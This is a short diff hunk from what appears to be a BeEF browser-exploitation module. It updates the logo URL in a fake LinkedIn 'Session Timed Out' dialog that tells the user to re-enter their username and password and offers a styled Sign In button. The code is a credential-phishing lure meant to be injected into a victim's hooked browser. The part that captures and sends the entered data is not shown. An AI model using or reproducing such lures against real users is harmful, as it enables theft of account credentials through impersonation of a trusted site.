@@ -151,7 +151,7 @@ beef.execute(function() {
 		var box_prestyle = 'style="color: #666;font-size: 11px;font-weight: bold;font-family: Arial,sans-serif;padding-left:30px;"';
 		var inputboxstyle = 'style="width:140px;font-size: 11px;height: 20px;line-height:20px;padding-left:4px;border-style: solid;border-width: 1px;border-color:#CDCDCD;"';	
 		var buttonstyle = 'style="font-size: 13px;background:#069;color:#fff;font-weight:bold;border: 1px #29447e solid;padding: 3px 3px 3px 3px;clear:both;margin-right:5px;"';
-		var lilogo = 'http://press.linkedin.com/display-media/209/1';
+		var lilogo = 'http://content.linkedin.com/etc/designs/linkedin/katy/global/clientlibs/img/logo.png';
         	var title = 'Session Timed Out <img src="' + lilogo + '" align=right height=20 width=70 alt="LinkedIn">';
 	        var messagewords = 'Your session has timed out due to inactivity.<br/><br/>Please re-enter your username and password to login.';
         	var buttonLabel = '<input type="button" name="ok" value="Sign In" id="ok" ' +buttonstyle+ ' onClick="document.getElementById(\'buttonpress\').value=\'true\'" onMouseOver="this.bgColor=\'#00CC00\'" onMouseOut="this.bgColor=\'#009900\'" bgColor=#009900>';
